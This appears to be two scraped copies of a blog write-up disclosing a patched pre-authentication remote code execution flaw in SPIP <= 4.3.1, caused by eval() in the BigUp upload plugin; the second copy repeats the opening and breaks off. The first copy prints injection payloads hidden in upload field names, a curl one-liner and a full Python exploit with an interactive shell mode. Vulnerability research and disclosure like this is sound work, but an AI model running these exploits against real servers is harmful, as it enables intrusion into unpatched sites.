=== Content from vozec.fr_387a7166_20250111_102959.html ===


# [brand image](/) [Vozec's Blog](/)

A student passionate about cybersecurity

* [About](/about/)
* [Writeups](/writeups/)
* [Researchs](/researchs/)
* [1/ Crypto RSA](/rsa/)
* [2/ Crypto AES](/aes/)
* [3/ Crypto Other](/other/)

powered by [Hugo](https://gohugo.io) | themed with [poison](https://github.com/lukeorth/poison)

¬© 2024 . All rights reserved.

# [Spip Preauth RCE 2024, my First CVE !](/researchs/spip-preauth-rce-2024-big-upload/)

September 4, 2024

 -
11 mins read

## Some Context

A month ago, [TheLaluka](https://x.com/TheLaluka/) [suggested](https://x.com/TheLaluka/status/1821821709499961817) finding his preauth RCE in SPIP as a challenge.
The challenge was very nice and I had nothing to do, so I decided to take a look at this CMS.

![tweet1](./img/tweet1.png)

He gave us a hint to narrow down the attack surface, as the project is substantial.
So, with [Worty](https://x.com/_Worty), we found the vulnerability and [won the challenge](https://x.com/TheLaluka/status/1824357306433253480)!

![win](./img/win.png)

*Above is a screenshot from the [*barbhack*](https://x.com/_barbhack_) rump we gave to release the yet-another-spip-rce-challenge: the one we‚Äôre disclosing today*

He sent us 2 bottles of arranged rums to congratulate us *(what a prince!)* and everything could have ended there, but I enjoyed the challenge and it gave me a vague idea of how Spip works. I still had several subtleties in mind and still had some free time, so I thought I‚Äôd keep on looking for vulnerabilities.

![rhum](./img/rhum.png)

So I‚Äôm going to present what will lead to a new `RCE preauth on versions <= 4.3.1` of this CMS:

* [blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702](https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702)

I found the CVE in an authenticated way, then reached out to Laluka to verify it wasn‚Äôt already known. We then worked together to make it work without authentication, greatly increasing the impact!

In the same way as his original post, we proposed a [new challenge during the Barbhack 2024](https://x.com/TheLaluka/status/1829929188381344007) event to find the vulnerability.

> This time, the winners were [GuilhemRioux](https://x.com/GuilhemRioux), and the second solve from [Chocapikk\_](https://x.com/Chocapikk_)! The third solve wanted to stay anon, therefore respecting their choice! √∞¬ü¬ò¬â

## Setup

The setup phase is quick, requiring only the CMS zip, an updated php and a few extensions such as **php-xml**, **php-zip** or **php-sqlite3**.

**libsodium** is also used for cryptography, and can be installed via the php extension manager [pecl](https://pecl.php.net/).

For a quick installation, **sqlite** is very pleasant, as it allows a clean installation without having to deploy and rely on an external database.

Here are the commands used:

```
mkdir spip3.4.1
cd spip3.4.1
wget https://files.spip.net/spip/archives/spip-v4.3.1.zip
unzip spip-v4.3.1.zip
apt update
pecl install -f libsodium
apt install -y php-xml php-zip php-sqlite3
php -S 0.0.0.0:8000

```

The installation page can be found here: <http://localhost:8000/spip.php?exec=install>

![spip_up](./img/spip_up.png)

## Code review

I had two ways of looking for vulnerable code in the php codebase.
The first was to trace my inputs on the various pages and see what code they triggered.
The second was to send payloads everywhere and see what resulted.

Both approaches are functional, especially on spip, which is notorious for evaluating just about anything in different places, ‚Äúfor some reasons‚Äù!

I decided to be clever and look for vulnerable sinks in the code.
The RCE for Laluka‚Äôs 1st challenge was in the code of the **√¢¬Ä¬úPortePlume√¢¬Ä¬ù** plugin, used to enhance Spip‚Äôs native textbox. This plugin had already been audited, and although there was still a very promising RCE sink, I‚Äôd gone over this plugin and wanted to discover some new code.
So I naturally decided to audit other plugins installed by default.

I started looking at the BigUp plugin code. It‚Äôs a plugin used this time for file uploading. It‚Äôs going to take care of saving the various uploaded images to disk, renaming them appropriately, handling big chunked uploads, and more.

The plugin is quite substantial:

```
.
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä action
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä bigup.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä balise
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä saisie_fichier.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_administrations.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_fonctions.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_pipelines.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä CHANGELOG.md
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä composer.json
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä css
√¢¬î¬Ç√Ç¬†√Ç¬† [.. SNIPPED ..]
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä formulaires
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä configurer_bigup.html
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä tester_bigup_extended.html
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä tester_bigup_extended.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä tester_bigup.html
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä tester_bigup.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä genie
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä bigup_nettoyer_repertoire_upload.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä inc
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Bigup
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä CacheFichiers.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Cache.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä CacheRepertoire.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Files.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Flow.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Formulaire.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä GestionRepertoires.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä Identifier.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä LogTrait.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä Repondre.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä Bigup.php
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä javascript
√¢¬î¬Ç√Ç¬†√Ç¬† [.. SNIPPED ..]
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä lang
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_ar.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_de.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_en.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_fr.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup_pt_br.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä bigup.xml
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet-bigup_ar.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet-bigup_de.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet-bigup_en.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet-bigup_fr.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet-bigup_pt_br.php
√¢¬î¬Ç√Ç¬†√Ç¬† √¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä paquet-bigup.xml
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä lib
√¢¬î¬Ç√Ç¬†√Ç¬† [.. SNIPPED ..]
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä paquet.xml
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä phpcs.xml.dist
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä phpstan-baseline.neon
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä phpstan.neon.dist
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä prive
√¢¬î¬Ç√Ç¬†√Ç¬† [.. SNIPPED ..]
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä README.md
√¢¬î¬ú√¢¬î¬Ä√¢¬î¬Ä saisies
√¢¬î¬Ç√Ç¬†√Ç¬† [.. SNIPPED ..]
√¢¬î¬î√¢¬î¬Ä√¢¬î¬Ä saisies-vues
    [.. SNIPPED ..]

```

Instead of spending time reading all the code, I started by researching dangerous behavior via [RegEx](https://fr.wikipedia.org/wiki/Expression_r%C3%A9guli%C3%A8re).

After several searches for dangerous functions: `eval`, `file_get_contents`, `system`‚Ä¶ as well as `arbitrary object instantiation` such as `$a($b) )` I finally found a dubiously coded function! √¢¬ò¬∫√Ø¬∏¬è

## The vulnerable function

In the `plugins-dist/bigup/inc/Bigup/Files.php` file, on line *230* the *extraire\_fichiers\_valides* function contains the following code:

```
public static function extraire_fichiers_valides() {
    $liste = [];
    if (!count($_FILES)) {
        return $liste;
    }
    $infos = []; // name, pathname, error √¢¬Ä¬¶
    foreach ($_FILES as $racine => $descriptions) {
        $infos = array_keys($descriptions);
        break;
    }
    foreach ($_FILES as $racine => $descriptions) {
        $error = $descriptions['error'];
        // cas le plus simple : name="champ", on s'emb√É¬™te pas
        if (!is_array($error)) {
            if ($error == 0) {
                $liste[$racine] = [$descriptions];
                unset($_FILES[$racine]);
            }
            continue;
        }
        // cas plus compliqu√É¬©s :
        // name="champ[tons][][sous][la][pluie][]"
        // $_FILES[champ][error][tons][0][sous][la][pluie][0]
        else {
            $chemins = Files::extraire_sous_chemins_fichiers($error);
            foreach ($chemins['phps'] as $k => $chemin) {
                $var = '$_FILES[\'' . $racine . '\'][\'error\']' . $chemin;
                eval("\$error = $var;");
                if ($error == 0) {
                    $description = [];
                    foreach ($infos as $info) {
                        $var = '$_FILES[\'' . $racine . '\'][\'' . $info . '\']' . $chemin;
                        eval("\$x = $var; unset($var);");
                        $description[$info] = $x;
                    }
                    $complet = $racine . $chemins['names'][$k];
                    if (empty($liste[$complet])) {
                        $liste[$complet] = [];
                    }
                    $liste[$complet][] = $description;
                }
            }
        }
    }
    return $liste;
}

```
> Do you smel it? That smelly RCE smel? √∞¬ü¬ë¬Ä

Indeed, a lot of eval is carried out!

Here‚Äôs the comments above the function read:

```
/**
 * Extrait et enl√É¬®ve de `$_FILES` les fichiers re√É¬ßus sans erreur
 * et cr√É¬©e un tableau avec pour cl√É¬© le champ d'origine du fichier
 *
 * @return array Tableau (champ => [description])
 */

```

The function seems to handle uploaded files, I didn‚Äôt have the courage to setup XDebug so a simple `echo` in the Docker logs will suffice for debugging.

It‚Äôs apparently used to pass from a path name to an array path. Why eval then?

So I added the following code at the start of the function, and displayed `$_FILES` to see what will pass through during uploads:

```
## Debug like a boss
error_log("######################################");
error_log("Call to extraire_fichiers_valides");
error_log(json_encode($_FILES));
error_log("######################################");

```

Plus we read this comment:

```
// cas plus compliqu√É¬©s :
// name="champ[tons][][sous][la][pluie][]"
// $_FILES[champ][error][tons][0][sous][la][pluie][0]

```

To trigger the various EVALs, we need to send a file with the parameter `name` of the form *champ[tons][][sous][la][pluie][]*.
So you can navigate from the logged-in area to `/ecrire` and upload an image. Here I‚Äôm using the form to send a profile photo

I also added:

```
error_log($racine);
error_log($chemin);
$var = '$_FILES[\'' . $racine . '\'][\'error\']' . $chemin;
error_log($var);

```

![error_log](./img/error_log.png)

Uploading an image sends 3 requests, 2 of which trigger the `extract_valid_files` function!

These two requests don‚Äôt contain the uploaded image, but they do reach our vulnerable code! √∞¬ü¬ò¬Å

```
POST /ecrire/?exec=auteur&id_auteur=1 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------35974249246826023222844215477
Content-Length: 1584
Origin: http://localhost:8000
Connection: keep-alive
Referer: http://localhost:8000/ecrire/?exec=auteur&id_auteur=1
Cookie: spip_session=1_d11b8a893cc1f545e2dee6e3e5ceb3ec; spip_admin=%40root%40root.root; spip_accepte_ajax=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="var_ajax"
form
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="exec"
auteur
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="id_auteur"
1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action"
editer_logo
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_args"
o7aLD55YnoVFatZHAGqAQwWZcL0Z6FaCfDb4yh9BlxHzEDHJjuuhj1zH/aQrCvgA3lRry1gAXIHgxJclaNiXP7J3xnoB+JE/twMTVpcmUQOczifhWzHFchZPDMxK0Sia4few939TklVQhnGYmdnbni4cOszvyb3ueOHYnGsiBda5GtVbmHwU3g4eAS/CgDM4SbQj5xvy0CLNKxbCbNL75db6W+NetjxgKlHBdLlpP8eiRnzNSd11MGmPqGezNBV+1CH5T/OUZkOfy2uKfo/WdwFGduql2JNpSUWmXLQY9RjR1ZwQredgR9E=
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_sign"
61e4242ff0083987cd3f876d5daa0a9ece8d7c772f4bb1f248ce3f4cb4bc9b47
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="bigup_retrouver_fichiers"
1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="formulaire_action_verifier_json"
true
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name="bigup_reinjecter_uniquement"
@28ef70ab@
-----------------------------35974249246826023222844215477--

```

![log1](./img/log1.png)

You can immediately see that `$_FILES` is empty:

```
[Mon Sep  2 20:46:49 2024] ######################################
[Mon Sep  2 20:46:49 2024] Call to extraire_fichiers_valides
[Mon Sep  2 20:46:49 2024] []
[Mon Sep  2 20:46:49 2024] ######################################

```

So we can ask our best friend to add a file to our POST request:

![gpt](./img/gpt.png)

And‚Ä¶ IT‚ÄôS A *small* WIN! We control the file passed to the function:

![code_triggered](./img/code_triggered.png)

![meme_gpt](./img/meme_gpt.png)

We can therefore adapt the `name` parameter with `[]`:

![first](./img/first.png)

Here is an extract from logs:

```
[Mon Sep  2 21:41:54 2024] ######################################
[Mon Sep  2 21:41:54 2024] Call to extraire_fichiers_valides
[Mon Sep  2 21:41:54 2024] {"HELLO":{"name":{"WORLD":"example.txt"},"full_path":{"WORLD":"example.txt"},"type":{"WORLD":"text\/plain"},"tmp_name":{"WORLD":"\/tmp\/phpB6Hmiq"},"error":{"WORLD":0},"size":{"WORLD":38}}}
[Mon Sep  2 21:41:54 2024] ######################################
[Mon Sep  2 21:41:54 2024] HELLO
[Mon Sep  2 21:41:54 2024] ['WORLD']
[Mon Sep  2 21:41:54 2024] $_FILES['HELLO']['error']['WORLD']

```

The last 3 lines correspond to `$racine` `$chemin` and `$var`.

`$var` corresponds to the string that will be evaluated next, passing *‚ÄúHELLO[WORLD]‚Äù*, here‚Äôs the string formed:

```
$_FILES['HELLO']['error']['WORLD']

```

The complete code evaluated will therefore be:

```
$error = $_FILES['HELLO']['error']['WORLD'];

```
## Remote Code Execution

> What happens if I send a single quote? √∞¬ü¬§¬î

Response: **The server returns a 500 error!**

![500](./img/500.png)

From the docker logs, we can read:

![500_log](./img/500_log.png)

Here we see that the `'` is not filtered, so the context is broken and the call to *eval* returns an error.

Finally, we can add a real payload to control the contents of the string between the square brackets.

The payload payload `HELLO[AB'.strval(5+5).'CD]` lead to this log line:

```
Undefined array key "AB10CD" in ... plugins-dist/bigup/inc/Bigup/Files.php(276) : eval()'d code on line 1

```

The rce is now trivial, with the following payload:

```
name="HELLO[AB'.system('id').die().'CD]"

```

![rce](./img/rce.png)

![win2](./img/win2.png)

My first reaction was like

![lalu](./img/lalu.png)

But in the end he confirmed that he didn‚Äôt have it in his notes!

If you‚Äôre curious, this was related to my [teasing tweet](https://x.com/Vozec1/status/1822647021733281895) from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep track & proofs).

```
[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
9fd0828be2a9d90e89e226f1fcd6d5d9  -

```
## Additional note:

The vulnerability can also be triggered in the first part of the name parameter:

```
name="RCE'-system('id')-'[ABCD]"

```

The dot is filtered, but you can use `sprintf` to call the `die` function after the `system` to avoid an error in logs:

```
name="RCE'-sprintf(system('id'),die())-'[ABCD]"

```

![isok](./img/isok.png)

Hello, Laluka here, I‚Äôll take the next part that makes this lovely post-auth RCE pre-auth! √∞¬ü¬ò¬â

## Making the RCE Pre-Auth

Once Vozec showed me that his issue was related to file upload, and required a form to submit, I had two thoughts:

* First, we might get lucky, maybe the code path is reached with any form?
* Second, if we‚Äôre unlucky, we‚Äôll have to find another path!

So, here‚Äôs the flow:

* `extraire_fichiers_valides()` from `plugins-dist/bigup/inc/Bigup/Files.php`, called by
  + `gerer_fichiers_postes()` within `plugins-dist/bigup/inc/Bigup.php`, called by
    - `bigup_formulaire_receptionner($flux)` within `plugins-dist/bigup/bigup_pipelines.php`

I stopped there, as the pipelining system behaves in a ‚Äúglobal‚Äù way, -close to- every pass through it, so let‚Äôs ‚Äúassume‚Äù we‚Äôre lucky, and hit right away!

The code only passes through the right code path if a specific parameter is present, so let‚Äôs add it! (i.e. `bigup_retrouver_fichiers=foo`)

```
/**
 * Branchement sur la r√É¬©ception d'un formulaire (avant verifier())
 *
 * On remet `$_FILES` avec les fichiers pr√É¬©sents pour ce formulaire,
 * et avant que la fonction verifier native du formulaire soit utilis√É¬©e,
 * de sorte qu'elle ait acc√É¬®s √É¬† $_FILES rempli.
 *
 * @pipeline formulaire_receptionner
 * @param array $flux
 * @return array
 */
function bigup_formulaire_receptionner($flux) {
	if (_request('bigup_retrouver_fichiers')) {
		$bigup = bigup_get_bigup($flux);
		$bigup->gerer_fichiers_postes(); // les fichiers post√É¬©s sans JS
		$liste = $bigup->reinserer_fichiers(_request('bigup_reinjecter_uniquement'));
		$bigup->surveiller_fichiers($liste);
	}
	return $flux;
}

```
> Note the `Branchement sur la r√É¬©ception d'un formulaire (avant verifier())` in the comment, clearly stating that all this logic (including eval) will take place before the verification/validation steps take place.. √∞¬ü¬ò

From there, I took one page that is almost always present, the ‚Äúforgotten password‚Äù one!

* http://0.0.0.0:8000/spip.php?page=spip\_pass&lang=fr

What I wanted to have in the request, is the `formulaire_action_args` protected and encoded variable at hand:

* I want to submit a `form`, therefore requiring `formulaire_action_args`
* With extra ‚Äúfiles‚Äù (our RCE payload)
* With our extra `bigup_retrouver_fichiers` param to enable the bigup part!

![formulaire_action_args](./img/formulaire_action_args.png)

Any extra steps? Nope! It worked right away! √∞¬ü¬ç¬Ä

## Unauth Spip RCE Final Exploit

As a script, this gives us the following concise exploit:

```
echo foo > foo.txt
cmd="id; date"
formulaire_action_args=$(curl -k 'http://127.0.0.1:8000/spip.php?page=spip_pass&lang=fr' | grep -F formulaire_action_args -C 3 | grep -ioP '[0-9a-zA-Z_/=+]{30,}')
echo "formulaire_action_args: $formulaire_action_args"
formulaire_action_args_encoded=$(python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))" "$formulaire_action_args")
echo "formulaire_action_args_encoded: $formulaire_action_args_encoded"
base_url="http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr&page=spip_pass&lang=fr"
final_payload="formulaire_action=oubli&formulaire_action_args=$formulaire_action_args_encoded&formulaire_action_sign=&oubli=foo%40foo.foo&nobot=&bigup_retrouver_fichiers=1"
curl -ki -X POST -F "RCE['.system('$cmd').die().'][][ll][[email¬†protected]](/cdn-cgi/l/email-protection)" "$base_url&$final_payload"

```

![rce](./img/spip-rce.png)

Vozec also made a python script for the same bug:

```
#!/bin/env python3
import argparse
import requests
import re
import io
import readline
from urllib.parse import unquote
from bs4 import BeautifulSoup
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings()
class exploit:
    def __init__(self, args) -> None:
        self.url = args.target
        self.s = requests.session()
    def get_tokens(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Accept": "*/*",
            "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
        r = requests.Request(
            url=url,
            method="GET",
            headers=headers,
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=False).text
        soup = BeautifulSoup(r, "html.parser")
        token = soup.find("input", {"name": "formulaire_action_args"})["value"]
        return token
    def exploit(self, cmd):
        token = self.get_tokens()
        mp_encoder = MultipartEncoder(
            fields={
                "page": "spip_pass",
                "lang": "fr",
                "formulaire_action": "oubli",
                "formulaire_action_args": token,
                "formulaire_action_sign": "",
                "oubli": "[[email¬†protected]](/cdn-cgi/l/email-protection)",
                "nobot": "",
                "bigup_retrouver_fichiers": "a",
                f"RCE['.system('{cmd}').die().']": (
                    "abc.txt",
                    io.BytesIO(b"Hello"),
                    "text/plain",
                ),
            }
        )
        url = f"{self.url}/spip.ph%70?pag%65=spip_pass&lang=fr"
        r = requests.Request(
            url=url,
            method="POST",
            data=mp_encoder,
            headers={"Content-Type": mp_encoder.content_type},
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=False)
        return r.text.strip()
def get_args():
    parser = argparse.ArgumentParser(description="RCE Spip <= 4.3.1")
    parser.add_argument(
        "-t", "--target", type=str, required=True, help="Target Url (ex: http://)"
    )
    parser.add_argument(
        "-c", "--cmd", type=str, required=False, help="Shell command to execute"
    )
    parser.add_argument(
        "-s", "--shell", action="store_true", help="Semi interactive shell"
    )
    args = parser.parse_args()
    return args
def main():
    args = get_args()
    x = exploit(args)
    if args.cmd:
        res = x.exploit(args.cmd)
        print(res)
    if args.shell:
        while 1:
            r = x.exploit(input("$ "))
            print(r)
if __name__ == "__main__":
    main()
"""
[~/Desktop/autre]$ python3 0day_rce_spip.py -t http://localhost:8000 -c id
uid=1000(vozec) gid=1000(vozec) groupes=1000(vozec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),995(input)
[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
9fd0828be2a9d90e89e226f1fcd6d5d9  -
"""

```
## Closing Words

Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing‚Ä¶ √∞¬ü¬ô¬É

> Nailed it! √∞¬ü¬ò¬é

![acknowledgement](./img/rce-rootme-acknowledgement.png)

---

As always, we hope you‚Äôve had a nice time reading our adventures! √∞¬ü¬ß¬ô

Feel free to follow both of us for future challenges & cool reads! √∞¬ü¬í¬ù

![us](./img/lalu-and-vozec.png)

---

####

* [Some Context](#some-context)
* [Setup](#setup)
* [Code review](#code-review)
* [The vulnerable function](#the-vulnerable-function)
* [Remote Code Execution](#remote-code-execution)
* [Additional note:](#additional-note)
* [Making the RCE Pre-Auth](#making-the-rce-pre-auth)
* [Unauth Spip RCE Final Exploit](#unauth-spip-rce-final-exploit)
* [Closing Words](#closing-words)



=== Content from thinkloveshare.com_5f5f9a7b_20250111_102958.html ===

[Think
Love
Share](/)

[![Author Image](/img/laluka.png)](/)

[InfoSec, Code, Thoughts & Feels](/)

* [Hacking](/hacking/)
* [OffenSkill](/offenskill/)
* [Streaming](/streaming/)
* [The Rest](/the_rest/)
* [Sponso](/sponso/)
* [About](/about/)

Need a **Training**,
**Pentest**, or **Code Audit**?
Visit[OffenSkill.com](https://offenskill.com/)

¬© 2024 Laluka.
[Licensing](https://creativecommons.org/licenses/by-nc-sa/4.0/).

# Spip Preauth RCE 2024: Part 2, A Big Upload

 Sep 4, 2024
 12 min read

[Translate](https://thinkloveshare-com.translate.goog/?_x_tr_sl=en&_x_tr_tl=fr)

 Any typos? Any ideas to suggest? Feedback appreciated!

---

> Hello dear reader,
>
> This article is the continuation of my Spip research, with a twist!
>
> One Spip Unauth RCE Challenge player ([@Vozec1](https://x.com/Vozec1)) came to me with an extra question after solving my initial challenge: ‚ÄúI think I found another similar bug, are you already aware of this issue?‚Äù
>
> And I was not (code changes fast)! We therefore worked together to make the most out of it, here‚Äôs our co-written story! üíå

## Some Context

Hello, [@Vozec1](https://x.com/Vozec1) here! üëã

A month ago, [TheLaluka](https://x.com/TheLaluka/) [suggested](https://x.com/TheLaluka/status/1821821709499961817) finding his preauth RCE in SPIP as a challenge.
The challenge was very nice and I had nothing to do, so I decided to take a look at this CMS.

![./tweet1](./tweet1.png)

He gave us a hint to narrow down the attack surface, as the project is substantial.
So, with [Worty](https://x.com/_Worty), we found the vulnerability and [won the challenge](https://x.com/TheLaluka/status/1824357306433253480)!

![win](win.png)

*Above is a screenshot from the [*barbhack*](https://x.com/_barbhack_) rump we gave to release the yet-another-spip-rce-challenge: the one we‚Äôre disclosing today*

He sent us 2 bottles of arranged rums to congratulate us *(what a prince!)* and everything could have ended there, but I enjoyed the challenge and it gave me a vague idea of how Spip works. I still had several subtleties in mind and still had some free time, so I thought I‚Äôd keep on looking for vulnerabilities.

![rhum](rhum.png)

So I‚Äôm going to present what will lead to a new `RCE preauth on versions <= 4.3.1` of this CMS:

* [blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702](https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0702)

I found the CVE in an authenticated way, then reached out to Laluka to verify it wasn‚Äôt already known. We then worked together to make it work without authentication, greatly increasing the impact!

In the same way as his original post, we proposed a [new challenge during the Barbhack 2024](https://x.com/TheLaluka/status/1829929188381344007) event to find the vulnerability.

> This time, the winners were [GuilhemRioux](https://x.com/GuilhemRioux), and the second solve from [Chocapikk\_](https://x.com/Chocapikk_)! The third solve wanted to stay anon, therefore respecting their choice! üòâ

## Setup

The setup phase is quick, requiring only the CMS zip, an updated php and a few extensions such as **php-xml**, **php-zip** or **php-sqlite3**.

**libsodium** is also used for cryptography, and can be installed via the php extension manager [pecl](https://pecl.php.net/).

For a quick installation, **sqlite** is very pleasant, as it allows a clean installation without having to deploy and rely on an external database.

Here are the commands used:

```
mkdir spip3.4.1
cd spip3.4.1
wget https://files.spip.net/spip/archives/spip-v4.3.1.zip
unzip spip-v4.3.1.zip
apt update
pecl install -f libsodium
apt install -y php-xml php-zip php-sqlite3
php -S 0.0.0.0:8000

```

The installation page can be found here: <http://localhost:8000/spip.php?exec=install>

![./spip_up](./spip_up.png)

## Code review

I had two ways of looking for vulnerable code in the php codebase.
The first was to trace my inputs on the various pages and see what code they triggered.
The second was to send payloads everywhere and see what resulted.

Both approaches are functional, especially on spip, which is notorious for evaluating just about anything in different places, ‚Äúfor some reasons‚Äù!

I decided to be clever and look for vulnerable sinks in the code.
